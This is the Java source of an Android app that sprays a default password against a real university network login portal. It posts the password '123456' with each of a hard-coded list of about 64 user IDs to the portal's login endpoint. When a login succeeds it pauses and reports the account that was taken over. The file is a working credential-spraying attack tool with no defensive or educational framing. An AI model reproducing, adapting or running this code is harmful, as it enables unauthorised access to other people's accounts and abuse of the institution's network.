package pw.usual.PortalBoasting;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.View;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ToggleButton;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.CoreConnectionPNames;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends Activity {
    /**
     * Called when the activity is first created.
     */
    private ToggleButton startButton;
    private TextView logArea;
    private ScrollView scrollView;

    private Handler handler;
    private ExecutorService pool;
    public boolean suspend = false;
    private Thread netThread = null;

    private View.OnClickListener onStartButtonClick = new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            Log.i("StartButton", "Click.");
            ToggleButton button = (ToggleButton) v;

            if (button.isChecked()){
//                logArea.setText("");
                if (null == netThread){
                    netThread = new AttemptThread();
                    netThread.start();
                }
                suspend = false;
            }
            else{
                suspend = true;
            }
        }
    };

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        startButton = (ToggleButton) findViewById(R.id.StartButton);
        logArea = (TextView) findViewById(R.id.LogArea);
        scrollView = (ScrollView) findViewById(R.id.ScrollView);
        handler = new MyHandler();
        pool = Executors.newSingleThreadExecutor();

        startButton.setOnClickListener(onStartButtonClick);
    }

    @Override
    public void onDestroy(){
        pool.shutdown();
        super.onDestroy();
    }

    private class AttemptThread extends Thread{
        private HttpPost httpPost = new HttpPost("http://w.nuaa.edu.cn/iPortal/action/doLogin.do");
        private HttpClient httpClient = new DefaultHttpClient();
        private HttpResponse httpResponse = null;

        private List<NameValuePair> params=new ArrayList<>();
        private BasicNameValuePair valueSaved = new BasicNameValuePair("saved", "0");
        private BasicNameValuePair valueDomain = new BasicNameValuePair("domain", "1");
        private BasicNameValuePair valueFrom = new BasicNameValuePair("from", "003cc944be32e25365428f2dd2adbbe2");
        private BasicNameValuePair valuePassword = new BasicNameValuePair("password", "123456");

        private String stringResponse = null;

        private int []users = {70206044,70205971,70205746,70205743,70205695,70205696,70205456,70205433,70205432,70205410,70205342,70205340,70205331,70205332,70205277,70205155,70205057,70205036,70205034,70204963,70204959,70204952,70204946,70204937,70204880,70204858,70204795,70204723,70204691,70204664,70204665,70204632,70204616,70204596,70204545,70204320,70204314,70204215,70204075,70203975,70203945,70203944,70203912,70203734,70203521,70203443,70203299,70203110,70202991,70202878,70202636,70202578,70202579,70202279,70202031,70201850,70201829,70201776,70201739,70201516,70201463,70201316,70200748,70200340};

        @Override
        public void run(){
            httpClient.getParams().setParameter(CoreConnectionPNames.CONNECTION_TIMEOUT, 3000);
            httpClient.getParams().setParameter(CoreConnectionPNames.SO_TIMEOUT, 3000);

            for (int user : users) {
                params.clear();
                params.add(valueSaved);
                params.add(valueDomain);
                params.add(valueFrom);
                params.add(valuePassword);
                params.add(new BasicNameValuePair("username", String.valueOf(user)));

                try {
                    httpPost.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
                    httpResponse = httpClient.execute(httpPost);

                    if (httpResponse.getStatusLine().getStatusCode() == 200) {
                        stringResponse = EntityUtils.toString(httpResponse.getEntity());
                        JSONObject json = new JSONObject(stringResponse);
                        String status = (String) new JSONObject((String) json.get("data")).get("status");

                        Message message = handler.obtainMessage(0x56, status);
                        message.arg1 = user;
                        message.sendToTarget();
                    }
                    else {
                        Log.e("Error", "Http response is " + String.valueOf(httpResponse.getStatusLine().getStatusCode()));
                    }
                }
                catch (JSONException e){
                    Log.e("JsonException", stringResponse);
                }
                catch (Exception e) {
                    Log.e("Error", e.getClass().toString());
                }

                while (suspend){
                    try {
                        Thread.sleep(1000);
                        Log.i("HeartBeat", String.valueOf(System.currentTimeMillis()));
                    }
                    catch (InterruptedException e){
                        Log.e("Error", e.getClass().toString());
                    }
                };
            }
        }
    }

    private class MyHandler extends Handler{
        @Override
        public void handleMessage(Message message){
            switch (message.what){
                case 0x56:{
                    Log.i("MessageHandle", String.valueOf(message.arg1) + " " + message.obj);

                    if (message.obj.equals("connected")){
                        suspend = true;
                        startButton.setChecked(true);
                    }

                    logArea.append(String.valueOf(message.arg1) + " " + message.obj + "\n");
                    scrollView.fullScroll(View.FOCUS_DOWN);

//                    if (0 == message.arg1 % 10){
//                        logArea.append(buffer);
//                        buffer = "";
//                    }
//                    else {
//                        buffer += String.valueOf(message.arg1) + " " + message.obj + "\n";
//                    }

//                    ScrollView::fullScroll(View.FOCUS_DOWN);

//                    if (message.obj.equals("succeed")){
//                        pool.shutdownNow();
//                        startButton.setChecked(false);
//
//                        Toast.makeText(MainActivity.this, "User " + String.valueOf(message.arg1) + " login successed", Toast.LENGTH_LONG).show();
//                    }
                }
                default:{
                    break;
                }
            }
            super.handleMessage(message);
        }
    }
}
